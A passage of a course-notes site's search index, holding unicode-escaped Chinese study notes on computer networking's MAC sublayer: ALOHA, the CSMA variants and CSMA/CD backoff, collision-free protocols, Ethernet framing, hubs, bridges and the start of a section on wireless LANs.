ALOHA\u5229\u7528\u7387\u4f4e\u7684\u4e00\u4e2a\u4e3b\u8981\u539f\u56e0\u5728\u4e8e\uff0c\u5373\u4fbf\u4e00\u4e2a\u6d88\u606f\u53ea\u6709\u6700\u540e\u6216\u5f00\u5934\u7684\u4e00\u5c0f\u90e8\u5206\u548c\u5176\u4ed6\u6d88\u606f\u51b2\u7a81\u4e86\uff0c\u5176\u4e5f\u4f1a\u5bfc\u81f4\u6d88\u606f\u9519\u8bef\uff0c\u90a3\u4e48\u9488\u5bf9\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u63d0\u51fa\u8981\u628a\u65f6\u95f4\u5206\u4e3a\u79bb\u6563\u7684slot</p> <p>\u200b\u200b</p> <p>\u7528\u6237\u53ea\u80fd\u5728\u6bcf\u4e2aslot\u7684\u5f00\u59cb\u65f6\u523b\u624d\u80fd\u53d1\u9001\u5e27\uff0c\u6bcf\u6b21\u4f20\u8f93\u5e27\u7684\u7528\u65f6\u5fc5\u987b\u5c0f\u4e8e\u7b49\u4e8e\u4e00\u4e2aslot\u7684\u957f\u5ea6</p> <p>\u8fd9\u79cd\u505a\u6cd5\u6700\u4f73\u5229\u7528\u7387\u80fd\u8fbe\u5230 1/e \u5dee\u4e0d\u591a\u662f36%</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#12-csma","title":"1.2 \u8f7d\u6ce2\u4fa6\u542c\u591a\u8def\u8bbf\u95ee CSMA","text":"<p>CSMA Carrier Sense Multiple Access\uff0c\u5176\u57fa\u672c\u601d\u60f3\u5728\u4e8e\uff0c\u6211\u8981\u53d1\u9001\u4fe1\u606f\u4e4b\u524d\u5148\u4fa6\u542c\u4e00\u4e0b\uff0c\u770b\u770b\u6709\u6ca1\u6709\u5176\u4ed6\u7528\u6237\u5728\u53d1\uff0c\u82e5\u65e0\uff0c\u518d\u53d1\u9001\u81ea\u5df1\u7684\u4fe1\u606f</p> <p>1-persistent CSMA</p> <p>\u8981\u53d1\u9001\uff0c\u5148\u4fa6\u542c\uff0c\u82e5\u5fd9\uff0c\u5219\u4e0d\u65ad\u4fa6\u542c\u5230\u4fe1\u9053\u7a7a\u95f2\u518d\u53d1\u9001\u3002\u82e5\u51b2\u7a81\uff0c\u5219\u7b49\u5f85\u968f\u673a\u65f6\u95f4\u91cd\u590d\u4e0a\u8ff0\u7b56\u7565</p> <p>\u4e4b\u6240\u4ee5\u8fd8\u4f1a\u51b2\u7a81\uff0c\u662f\u56e0\u4e3a\u5b58\u5728Propagation Delay</p> <p>\u7f3a\u70b9\u5728\u4e8e\uff0c\u82e5\u4e24\u4e2a\u4fe1\u9053\u90fd\u5728\u4fa6\u542c\u7b49\u5f85\u4fe1\u9053\u7a7a\u95f2\uff0c\u7136\u540e\u5728\u7a7a\u95f2\u7684\u4e00\u77ac\u95f4\u5f00\u59cb\u53d1\u9001\u4fe1\u606f\uff08\u56e0\u4e3a\u6709delay\u7684\u5b58\u5728\uff0c\u5176\u4e0d\u4f1a\u77ac\u65f6\u53d1\u73b0\u4fe1\u9053\u5fd9\uff09\uff0c\u5fc5\u7136\u4f1a\u51b2\u7a81\uff0c\u5bfc\u81f4\u5229\u7528\u7387\u4e0b\u964d</p> <p>\u5373\u4fbf\u5982\u6b64\uff0c\u4fe1\u9053\u5229\u7528\u7387\u4ecd\u7136\u9ad8\u4e8eALOHA</p> <p>nonpersistent CSMA</p> <p>\u4e3a\u4e86\u907f\u514d\u4e0a\u8ff0CSMA\u7684\u7f3a\u9677\uff0c\u6211\u4eec\u91c7\u7528\u4e00\u79cd\u673a\u5236\uff0c\u5f53\u4fa6\u542c\u5230\u5fd9\u4e4b\u540e\uff0c\u653e\u5f03\u4fa6\u542c\uff0c\u7b49\u5f85\u968f\u673a\u65f6\u95f4\uff0c\u518d\u4fa6\u542c</p> <p>p-persistent CSMA</p> <p>\u8fd9\u79cd\u65b9\u6cd5\u7528\u4e8e slotted channels</p> <ul> <li>\u82e5\u4fa6\u542c\u5230\u5fd9\uff0c\u5219\u4e0b\u4e00\u4e2aslot\u518d\u542c</li> <li>\u82e5\u4fa6\u542c\u5230\u7a7a\u95f2\uff0c\u5219\u6709p\u7684\u6982\u7387\u53d1\u9001\u6570\u636e\uff0c\u67091-p\u7684\u6982\u7387\u7b49\u5230\u4e0b\u4e00\u4e2aslot\u518d\u542c</li> <li>\u82e5\u51b2\u7a81\uff0c\u8fd8\u662f\u7b49\u5f85\u968f\u673aslot</li> </ul> <p>\u200b\u200b</p> <p>CSMA/CD CSMA with Collision Detection</p> <p>\u4e4b\u524d\u7684CSMA\u90fd\u662f\u4f9d\u9760\u7b49\u5f85\u786e\u8ba4\u5e27\uff0c\u8fd9\u662f\u6709\u4e00\u5b9a\u6d6a\u8d39\u7684\uff0c\u4f46\u662f\u5728\u4e00\u4e9b\u94fe\u8def\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u53d1\u9001\u8fc7\u7a0b\u4e2d\u5c31\u68c0\u6d4b\u5230\u3002</p> <p>\u4f46\u662f\u8fd9\u79cd\u68c0\u6d4b\u673a\u5236\u5b58\u5728\u4e00\u4e2a\u9650\u5236\uff0c\u5047\u8bbe t \u662f\u6700\u8fdc\u7684\u4e24\u4e2a\u7ad9\u4e4b\u95f4\u7684\u4f20\u64ad\u7528\u65f6\uff0c\u90a3\u4e48\u6211\u4eec\u63a5\u53d7\u5230\u51b2\u7a81\u7684\u6700\u957f\u65f6\u95f4\u5c31\u662f 2t\uff0c\u8fd9\u4e5f\u5c31\u8981\u6c42\u6211\u4eec\u57282t\u65f6\u95f4\u5185\u53ea\u80fd\u53d1\u9001\u4e00\u4e2a\u5e27\uff0c\u5426\u5219\u6211\u4eec\u5c31\u4e0d\u77e5\u9053\u51b2\u7a81\u53d1\u751f\u5728\u54ea\u4e2a\u5e27\u4e0a\u4e86</p> <p>\u4e8e\u662f\u6211\u4eec\u6709\u5982\u4e0b\u516c\u5f0f</p> \\[ \\frac{Frame\\ len}{BW}\\geq2t \\] <p>\u8be5\u79cd\u5f62\u5f0f\u9002\u7528\u4e8e\u603b\u7ebf\u578b\u7f51\u7edc\u548c\u534a\u53cc\u5de5\u7f51\u7edc\u5f62\u5f0f</p> <p>\u4e8c\u8fdb\u5236\u6307\u6570\u9000\u907f\u7b97\u6cd5</p> <ul> <li>\u786e\u5b9a\u4e00\u4e2a\u57fa\u672c\u9000\u907f\u65f6\u95f4 T \u4e00\u822c\u5c31\u662f\u4e0a\u8ff0\u7684 2t</li> <li>\u63a8\u8fdf\u91cd\u4f20\u7684\u65f6\u95f4\u662f \\([0,1,...,(2^k-1)]\\) \u968f\u673a\u53d6\u4e00\u4e2a\u6570\u4e58\u4e0aT\uff0c\u5176\u4e2dk\u4e3a \\(\\min(\u91cd\u4f20\u6b21\u6570\uff0c10)\\)</li> <li>\u5f53\u91cd\u4f20\u8d85\u8fc716\u6b21\u7684\u65f6\u5019\uff0c\u786e\u5b9a\u51fa\u9519\uff0c\u4e0d\u518d\u53d1\u9001</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#13-collision-free-procotols","title":"1.3 \u65e0\u51b2\u7a81\u534f\u8bae collision-free procotols","text":"<p>\u57fa\u7840\u4f4d\u56fe\u534f\u8bae The basic bit-map protocol</p> <p>\u200b\u200b</p> <p>\u7ef4\u62a4\u516b\u4e2aslots\uff0c\u6bcf\u4e00\u8f6e\uff0c\u90fd\u53bb\u8be2\u95ee8\u4e2a\u7528\u6237\u662f\u5426\u8981\u53d1\u6d88\u606f\uff0c\u6bd4\u5982\u7b2c\u4e00\u8f6e\u8bb0\u5f55\u5b8c\u4e4b\u540e\uff0c\u67091 3 7\u8981\u53d1\u6d88\u606f\uff0c\u90a3\u4e48\u4ed6\u4eec\u4e09\u4e2a\u4f9d\u6b21\u53d1\u6d88\u606f</p> <p>\u8fd9\u79cd\u5728\u53d1\u9001\u6570\u636e\u4e4b\u524d\u5148\u5e7f\u64ad\u53d1\u9001\u610f\u613f\u7684\u534f\u8bae \u79f0\u4e3a\u9884\u7559\u534f\u8bae reservation protocol</p> <p>\u4ee4\u724c\u73af\u534f\u8bae Token Ring Protocol</p> <p>\u200b\u200b</p> <p>\u5c06\u6240\u6709\u7684\u7528\u6237\u7f16\u6210\u4e00\u4e2a\u73af\uff0c\u53ea\u6709\u6301\u6709token\u7684\u7528\u6237\u624d\u80fd\u53d1\u6d88\u606f</p> <ul> <li>\u6709token\uff0c\u4f46\u662f\u6ca1\u6d88\u606f\u53d1\uff0c\u76f4\u63a5\u4f20\u7ed9\u4e0b\u4e00\u4e2a\u4eba</li> <li> <p>\u6709token\uff0c\u6709\u6d88\u606f\u53d1\uff0c\u53d1\u5b8c\u6536\u5230\u786e\u8ba4\uff0c\u4f20\u7ed9\u4e0b\u4e00\u4e2a\u4eba</p> </li> <li> <p>\u53d1\u7684\u65f6\u5019\u4e5f\u7ed5\u4e00\u4e2a\u5708\uff0c\u9700\u8981\u786e\u8ba4\uff0c\u56de\u5230\u53d1\u7684\u4eba\u7684\u65f6\u5019\u7ed3\u675f\uff0c\u518d\u751f\u6210\u4e00\u4e2atoken\u7ee7\u7eed\u4f20</p> </li> <li>\u65e0token\uff0c\u7b49\u5f85</li> </ul> <p>\u4e8c\u8fdb\u5236\u5012\u8ba1\u6570\u534f\u8bae Binary Countdown Protocol</p> <p>\u6bd4\u65b9\u8bf4\u6211\u4eec\u670916\u4e2a\u7528\u6237\uff0c\u6211\u4eec\u7ed9\u6bcf\u4e2a\u7528\u6237\u4e00\u4e2a\u7f16\u53f7\uff0c\u5e76\u4e14\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236 \u4e5f\u5c31\u662f 0000\u52301111\uff0c\u6211\u4eec\u67094 bit\u7684\u7f16\u53f7</p> <p>\u6bcf\u6b21\u6211\u4eec\u8981\u53d1\u6d88\u606f\u7684\u65f6\u5019\uff0c\u5148\u8fdb\u884c\u4e00\u4e2a4bit\u7684\u8be2\u95ee\uff0c\u6bcf\u4e2a\u5bf9\u5e94bit\u4f4d\u4e3a1\u7684\u53d1\u58f0\uff0c\u7136\u540e\u627e\u5230\u7f16\u53f7\u6700\u5927\u7684\u90a3\u4e2a\uff0c\u8ba9\u5b83\u53d1\u6d88\u606f\uff0c\u5982\u679c\u4f60\u53d1\u73b0\u4f60\u4e3a0\u7684\u4f4d\uff0c\u6709\u5176\u4ed6\u7528\u6237\u53d1\u58f0\u4e86\uff0c\u8bf4\u660e\u4f60\u7684\u7f16\u53f7\u66f4\u4f4e\uff0c\u5c31\u4e0d\u518d\u53d1\u9001</p> <p>\u200b\u200b</p> <ul> <li>CSMA/CA \u662f\u51b2\u7a81\u907f\u514d\u800c\u4e0d\u662f\u65e0\u51b2\u7a81</li> </ul>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#14-limited-contentiion-protocols","title":"1.4 \u6709\u9650\u7ade\u4e89\u534f\u8bae limited-contentiion protocols","text":"<p>\u81ea\u9002\u5e94\u6811\u904d\u5386\u534f\u8bae The Adaptive Tree Walk Protocol*</p> <p>\u200b\u200b</p> <p>\u4eceroot\u5f00\u59cb\u904d\u5386\uff0c\u82e5\u662f1\u5f00\u59cb\u5c31\u6ca1\u6709\u51b2\u7a81\uff0c\u5c31\u8ba9\u90a3\u4e2a\u7528\u6237\u53d1\uff0c\u82e5\u662f\u6709\u51b2\u7a81\uff0c\u5206\u6210\u4e24\u90e8\u5206\u68c0\u67e5\uff0c\u7136\u540e\u65e0\u51b2\u7a81\u7684\u53d1\uff1f</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#2","title":"2. \u4ee5\u592a\u7f51","text":"<p>\u4e00\u4e2a 10 Mbps \u7684\u4ee5\u592a\u7f51\u6807\u51c6\u5728 1978 \u5e74\u88ab\u5236\u5b9a\u51fa\u6765\uff0c\u79f0\u4e3aDIX standard\uff0c1983\u5e74\u53c8\u88ab\u4fee\u8ba2\u4e3a IEEE 802.3 \u6807\u51c6</p> <p>\u200b\u200b</p> <p>\u4ee5\u592a\u7f51\u662f\u73b0\u5728\u6700\u6d41\u884c\u7684\u6709\u7ebf\u5c40\u57df\u7f51\u6280\u672f\uff0c\u5728\u903b\u8f91\u4e0a\u91c7\u7528\u603b\u7ebf\u578b\u62d3\u6251\u7ed3\u6784\uff0c\u4f7f\u7528CSMA/CD\u8fdb\u884c\u5bf9\u603b\u7ebf\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u4fe1\u606f\u603b\u662f\u4ee5\u5e7f\u64ad\u7684\u5f62\u5f0f\u53d1\u9001</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#20","title":"2.0 \u4e00\u4e9b\u5176\u4ed6\u7684\u5c40\u57df\u7f51\u6280\u672f","text":"<p>\u89c1\u738b\u9053</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#21","title":"2.1 \u7269\u7406\u5c42","text":"<p>\u200b\u200b</p> <p>\u8bbe\u5907\u901a\u8fc7 Transceiver \u8fde\u5728 Ether\u4e0a\uff0c\u4ee5\u592a\u7f51\u7684\u6bcf\u4e2a\u7248\u672c\u90fd\u6709\u7535\u7f06\u957f\u5ea6\u7684\u9650\u5236\uff0c\u8d85\u8fc7\u8fd9\u4e2a\u9650\u5236\u7684\u7f51\u7edc\u53ef\u4ee5\u7528 \u4e2d\u7ee7\u5668 repeater \u5c06\u591a\u6761\u7ebf\u7f06\u94fe\u63a5\u8d77\u6765</p> <p>\u4f46\u662f\u4ecd\u7136\u5b58\u5728\u9650\u5236\uff0ctransceiver\u4e4b\u95f4\u6700\u5927\u8ddd\u79bb\u4e3a 2.5 km \u548c \u6700\u5927\u7ecf\u8fc7 4 \u4e2a repeater</p> <p>\u5728\u7535\u7f06\u4e0a\uff0c\u4fe1\u606f\u53d1\u9001\u91c7\u7528 Manchester \u7f16\u7801</p> <p>\u96c6\u7ebf\u5668 Hub</p> <p>\u200b\u200b</p> <p>\u4f20\u7edf\u7684\u63a5\u7ebf\u6a21\u5f0f\u4e0d\u592a\u65b9\u4fbf\u8bbe\u5907\u7684\u589e\u51cf\uff0c\u51fa\u73b0\u65ad\u88c2\u60c5\u51b5\u4e5f\u5f88\u96be\u5b9a\u4f4d</p> <p>Hub\u6709\u5f88\u591a\u63a5\u53e3\uff0c\u6bcf\u4e2a\u63a5\u53e3\u7b80\u5355\u8fde\u63a5\u8d77\u6765\uff0c\u4efb\u4f55\u4e00\u4e2a\u63a5\u53e3\u4f20\u6765\u7684\u5e27\u4f1a\u88ab\u4f20\u64ad\u5230\u5176\u4ed6Port\uff0cPort\u7684\u8bbe\u7f6e\u65b9\u4fbf\u4e86\u8bbe\u5907\u589e\u51cf\u548c\u5b9a\u4f4d\u95ee\u9898</p> <p>Hub\u662f\u4e00\u4e2a\u7269\u7406\u5c42\u8bbe\u5907\uff0c\u6ca1\u6709\u6570\u636e\u7406\u89e3\uff0c\u5904\u7406\uff0c\u7f13\u5b58\u80fd\u529b\uff0c\u53ea\u505a\u4f20\u64ad</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#22","title":"2.2 \u4f20\u8f93\u534f\u8bae","text":"<p>\u4ee5\u592a\u7f51\u662f\u65e0\u8fde\u63a5\u7684\uff0c\u4e5f\u4e0d\u63d0\u4f9b\u786e\u8ba4\uff0c\u4f7f\u7528 1-persistent CSMA/CD \u7b97\u6cd5\uff08\u4ee5\u592a\u7f51\u7684\u4f20\u8f93\u65f6\u95f4\u4e0a\u9650\uff09 \u8fdb\u884c\u4f20\u8f93\uff0c\u901a\u8fc7\u4fa6\u542c\u6709\u6ca1\u6709\u51b2\u7a81\u6765\u5224\u65ad\u53d1\u9001\u7684\u7ed3\u679c\u3002</p> <p>\u5982\u679c\u7ad9\u4fa6\u542c\u5230\u4e86\u51b2\u7a81\uff0c\u4f1a\u53d1\u9001\u4e00\u4e2a\u77ed\u7684\u51b2\u7a81\u52a0\u5f3a\u4fe1\u53f7\uff08short jam signal\uff09\u786e\u4fdd\u53e6\u4e00\u4e2a\u53d1\u9001\u7ad9\u4e5f\u542c\u5230\u4e86\u51b2\u7a81</p> <p>\u6ca1\u6709\u4fa6\u542c\u5230\u51b2\u7a81\u4e0d\u4ee3\u8868\u6ca1\u6709\u9519\u8bef\uff0c\u4f46\u662f\u6211\u4eec\u89c6\u4e3a\u6ca1\u6709\u9519\u8bef\uff0c\u6709\u9519\u8bef\u4ea4\u7ed9\u9ad8\u5c42\u89e3\u51b3</p> <p>\u200b\u200b</p> <p>\u4ee5\u592a\u7f51\u4ee5 \u4e8c\u8fdb\u5236\u6307\u6570\u540e\u9000 binary exponential backoff \u7b97\u6cd5\u786e\u5b9a\u6bcf\u6b21\u51b2\u7a81\u7684\u7b49\u5f85\u65f6\u95f4\u3002\u6211\u4eec\u5c06\u65f6\u95f4\u6309\u7167 51.2 us \u5206\u5757\uff1b\u5728\u7b2c \\(i=1\\sim15\\) \u6b21\u51b2\u7a81\u53d1\u751f\u540e\uff0c\u7b49\u5f85\\(0\\sim\\min(2^i-1,\\ 1023)\\)\u4e2a\u65f6\u95f4\u69fd\u4e4b\u540e\u518d\u6b21\u5c1d\u8bd5\u53d1\u9001\uff0c\u53d1\u751f16\u6b21\u51b2\u7a81\u4e4b\u540e\u653e\u5f03\u53d1\u9001\uff0c\u5e76\u8fd4\u56de\u4e0a\u5c42\u4e00\u4e2a\u5931\u8d25\u62a5\u544a</p> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#23","title":"2.3 \u5e27\u7ed3\u6784","text":"<p>\u200b\u200b</p> <p>\u5728\u4e0d\u8ba1\u7b97\u524d\u5bfc\u7801\u7684\u60c5\u51b5\u4e0b\uff0cMAC\u7ed9\u6570\u636e\u5305\u589e\u52a0\u4e8618B\u7684\u957f\u5ea6</p> <p>DIX\u548cIEEE802.3\u6709\u6240\u4e0d\u540c</p> <ul> <li> <p>Preamble \u8fd9\u4e2a\u90e8\u5206\u662f\u4e0d\u4f1a\u4f5c\u4e3a\u5e27\u7684\u4e00\u90e8\u5206\u7b97\u5165 CheckSum \u548c length \u91cc\u9762</p> </li> <li> <p>\u5176\u4f1a\u53d1\u90018\u4e2a\u5b57\u8282\uff0c\u524d7\u4e2a\u5b57\u8282\u90fd\u662f10101010\uff0c\u7528\u6765\u540c\u6b65\u901f\u7387\uff0c\u7b2c8\u4e2a\u5b57\u8282\u662f10101011\uff08SOF Start of Frame\uff09\u63d0\u793a\u5e27\u7684\u5f00\u59cb</p> </li> <li>Dest addr \u7b2c\u4e00\u4e2abit\u662f0\uff0c\u8868\u793a\u662f\u5355\u64ad unicasting\uff0c\u7b2c\u4e00\u4e2abit\u662f1\u8868\u793a\u7ec4\u64ad multicasting\uff0c\u51681\u8868\u793a\u5e7f\u64ad boardcasting\uff0c\u5b9e\u9645\u4e0a\u800c\u8a00\u5176\u5b9e\u90fd\u5e7f\u64ad\uff0c\u53ea\u4e0d\u8fc7\u6bcf\u4e2a\u63a5\u6536\u65b9\u4f1a\u68c0\u67e5\u4e00\u4e0b\uff0c\u81ea\u5df1\u662f\u4e0d\u662f\u5355\u64ad/\u7ec4\u64ad\u7684\u5bf9\u8c61\u6216\u8005\u5e72\u8106\u5c31\u662f\u5e7f\u64ad\uff0c\u518d\u9009\u62e9\u63a5\u6536</li> <li> <p>MAC \u91cc\u7684 addr\u662f\u5168\u7403\u552f\u4e00\u7684\uff0c\u7531IEEE\u7edf\u4e00\u5206\u914d\uff0c\u524d3\u4e2a\u5b57\u8282\u79f0\u4e3aOUI Organizationally Unique Identifier\uff0c\u5206\u914d\u7ed9\u7f51\u7edc\u8bbe\u5907\u5236\u9020\u5546\uff1b\u7f51\u7edc\u8bbe\u5907\u5236\u9020\u5546\u518d\u5206\u914d\u7ed9\u7f51\u7edc\u8bbe\u5907\uff0c\u5e76\u5199\u5165 \u7f51\u7edc\u63a5\u53e3\u5361 NIC network interface card\uff0c\u4e5f\u5c31\u662f\u7f51\u5361\uff0c\u4e5f\u53eb\u505a adapter \u7f51\u7edc\u9002\u914d\u5668</p> </li> <li> <p>\u5176\u5de5\u4f5c\u5728\u6570\u636e\u94fe\u8def\u5c42\uff0cMAC\u5730\u5740\u4e00\u822c\u4ee5\u8fde\u5b57\u7b26\u5206\u5272\u768412\u4e2a\u5341\u516d\u8fdb\u5236\u6570\u8868\u793a\uff0c\u9ad824\u4f4d\u4e3a\u5382\u5546\u4ee3\u7801\uff0c\u4f4e24\u4f4d\u4e3a\u5382\u5546\u81ea\u884c\u5206\u914d\u7684\u9002\u914d\u5668\u5e8f\u5217\u53f7</p> </li> <li> <p>\u540e\u9762\u4e24\u4e2a\u5b57\u8282\uff0c\u5728DIX\u4e2d\u8868\u793a\u7c7b\u578b\uff0c\u8fd9\u4e2a\u7c7b\u578b\u662f\u6307\u7f51\u7edc\u5c42\u534f\u8bae\u7684\u7c7b\u578b\uff0c\u800cIEEE802.3\u4e2d\u5b58\u50a8\u4e86Data\u7684\u957f\u5ea6</p> </li> <li> <p>\u4f46\u662f\u5176\u5b9eDIX\u4e2d\u4e5f\u5b58\u50a8\u4e86\u957f\u5ea6\uff0c802.3\u4e2d\u4e5f\u5b58\u50a8\u4e86\u7c7b\u578b\uff0c\u8fd9\u90e8\u5206\u90fd\u7531LLC\u5b58\u50a8\u5728\u6570\u636e\u5305\u4e2d</p> </li> <li>\u540e\u9762\u5c31\u662fData\u5b57\u6bb5\uff0cDIX\u4e2d\u8bbe\u7f6e\u4e86data\u5b57\u6bb5\u7684\u4e0a\u7ebf\u4e3a1500\u5b57\u8282</li> <li>Padding \u4fdd\u8bc1\u5e27\u957f\u5ea6\u4e0d\u4f4e\u4e8e64\u5b57\u8282\uff08\u4e0d\u7b97\u4e0aPreamble\uff09</li> <li>\u6700\u540e\u4e00\u4e2a\u5b57\u6bb5\u662f\u6821\u9a8c\u548c \u752832\u4f4dCRC</li> </ul> <p>\u4ee5\u592a\u7f51\u7684\u5e27\u5b9a\u754c</p> <p>\u4ee5\u592a\u7f51\u4f7f\u7528Manchester\u7f16\u7801\uff0c\u5176\u53ea\u8981\u4fdd\u8bc1\u53d1\u9001\u5b8c\u4e00\u4e2a\u5e27\u4e4b\u540e\u5b58\u5728\u4e00\u6bb5\u65f6\u95f4\u7684\u95f4\u9699\uff0c\u8fd9\u4e2a\u95f4\u9699\u7684\u6ce2\u5f62\u5c31\u5c5e\u4e8eManchester\u7684\u8fdd\u89c4\u7f16\u7801\uff0c\u56e0\u6b64\u5c31\u80fd\u5b9e\u73b0\u5e27\u5b9a\u754c</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#24","title":"2.4 \u7f51\u6865","text":"<p>\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u7cfb\u5217\u7684LAN\uff0c\u7136\u540e\u6211\u4eecLAN\u4e4b\u95f4\u9700\u8981\u901a\u4fe1\uff0c\u8981\u5982\u4f55\u53bb\u5b9e\u73b0\u8fd9\u4e00\u70b9</p> <p>\u76f4\u63a5\u8fde\u63a5</p> <p>\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u62ff\u4e00\u6839\u7535\u7f06\u76f4\u63a5\u8fde\u63a5\u8fd9\u4e9bLAN\uff0c\u4f46\u662f\u8fd9\u79cd\u505a\u6cd5\u6709\u95ee\u9898</p> <ul> <li>\u8fd9\u79cd\u505a\u6cd5\u4f1a\u5bfc\u81f4\u6bcf\u4e2aLAN\u91cc\u6240\u6709\u7684\u4fe1\u606f\u90fd\u53d1\u9001\u7ed9\u5176\u4ed6LAN\uff0c\u6709\u6d6a\u8d39\u4e0d\u8bf4\uff0c\u5927\u90e8\u5206\u4fe1\u606f\u6211\u4eec\u5176\u5b9e\u53ea\u5e0c\u671b\u5185\u90e8\u4ea4\u6d41\uff0c\u6709\u5b89\u5168\u6027\u95ee\u9898</li> <li>802.3\u9650\u5236\u4e86\u6700\u957f\u7ebf\u8def\u957f\u5ea6\u4e3a2.5km</li> <li>\u4e0d\u540c\u7684LAN\u6709\u4e0d\u540c\u7684\u8fd0\u884c\u901f\u5ea6\u548c\u7f51\u7edc\u7c7b\u578b\uff0c\u76f4\u63a5\u76f8\u8fde\u662f\u65e0\u6cd5\u5de5\u4f5c\u7684</li> </ul> <p>\u56e0\u6b64\u5176\u5b9e\u6211\u4eec\u9700\u8981\u4fdd\u6301LAN\u76f8\u4e92\u9694\u79bb\u7684\u72b6\u6001\uff0c\u7ed9\u5b83\u4eec\u63d0\u4f9b\u9014\u5f84\u7ed9\u5176\u4ed6LAN\u53d1\u6d88\u606f\uff0c\u56e0\u6b64\u4eba\u4eec\u5f00\u53d1\u51fa\u7f51\u6865 bridge</p> <p>\u5728LAN\u5185\u90e8\u6d88\u606f\u4f20\u8f93\u4e2d\uff0c\u4e0d\u5e94\u8be5\u611f\u77e5\u5230bridge\u7684\u5b58\u5728</p> <p>\u57fa\u672c\u539f\u7406</p> <p>\u200b\u200b</p> <p>\u7f51\u6865\u5de5\u4f5c\u5728 \u6df7\u6742\u6a21\u5f0f promiscuous mode \u4e0b\uff0c\u5176\u6355\u83b7\u6240\u6709\u53d1\u7ed9\u5b83\u7684\u6570\u636e\uff08\u6df7\u6742\u6a21\u5f0f\u7684\u5b9a\u4e49\uff09\uff0c\u5982\u679c\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u5728\u540c\u4e00\u4e2a\u7f51\u6865\u63a5\u53e3\uff08\\(A\\rightarrow C\\)\uff09\u5c31\u4e22\u5f03\u8fd9\u4e2a\u5305\uff1b\u82e5\u4e0d\u5728\u4e00\u4e2a\u63a5\u53e3\uff08\\(A\\rightarrow F\\)\uff09\u5c31\u8fdb\u884c\u4e00\u4e2a\u8f6c\u53d1</p> <p>\u7f51\u6865\u4e4b\u6240\u4ee5\u80fd\u505a\u8fd9\u79cd\u8f6c\u53d1\uff0c\u663e\u7136\u5176\u5185\u90e8\u8bb0\u5f55\u4e86MAC\u5730\u5740\u5230\u7aef\u53e3\u53f7\u7684\u6620\u5c04\uff0c\u4e5f\u5c31\u662f\u6709\u4e00\u4e2a\u54c8\u5e0c\u8868\u3002\u4f46\u662f\u8fd9\u4e2a\u54c8\u5e0c\u8868\u5e76\u975e\u662f\u4e00\u5f00\u59cb\u5c31\u5b8c\u6210\u8bbe\u7f6e\u7684\uff0c\u800c\u662f\u901a\u8fc7\u5b66\u4e60\u5f97\u6765\u7684</p> <p>\u5f53A\u7ed9B\u53d1\u5305\uff0c\u7f51\u6865\u5c31\u628aA\u52a0\u51651\u53f7\u8fd9\u4e2a\u7aef\u53e3\u7684\u6620\u5c04\uff0c\u7136\u540e\u56e0\u4e3a\u8fd9\u65f6\u5019\u4e0d\u77e5\u9053B\u5728\u54ea\uff0c\u5c31\u628aB\u8f6c\u53d1\u7ed9\u9664\u4e86A\u4ee5\u5916\u6240\u6709\u7aef\u53e3\u3002</p> <ul> <li>\u8fd9\u79cd\u5b66\u4e60\u6cd5\u79f0\u4e3a \u540e\u5411\u5b66\u4e60\u6cd5 backward learning</li> <li>\u8fd9\u79cd\u5168\u8f6c\u53d1\u7684\u65b9\u6cd5\u79f0\u4e3a flooding algorithm</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#25","title":"2.5 \u9ad8\u901f\u4ee5\u592a\u7f51","text":"<ul> <li>\u4ee5\u592a\u7f51\u7684\u6700\u5c0f\u957f\u5ea6\u662f 64 B\uff0c\u800c\u901f\u7387\u6709\u6240\u4e0d\u540c</li> </ul> <p>\u200b\u200b</p>"},{"location":"ZJU-course/%E8%AE%A1%E7%BD%91/%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E5%AD%90%E5%B1%82/#3-wlan","title":"3. WLAN","text":"<p>WLAN \u65e0\u7ebf\u7684\u5c40\u57df\u7f51\u5b58\u5728\u4e00\u4e9b\u7279\u6b8a\u6027</p> <ul> <li>\u4f5c\u4e3a\u65e0\u7ebf\u901a\u4fe1\u7cfb\u7edf\u5176\u4e0d\u80fd\u68c0\u6d4b\u51fa\u6b63\u5728\u53d1\u751f\u7684\u51b2\u7a81\uff0c\u56e0\u4e3a\u5176\u6536\u5230\u7684\u4fe1\u53f7\u6bd4\u53d1\u51fa\u7684\u578b\u53f7\u8981\u5f31\u7684\u591a\u3002</li> 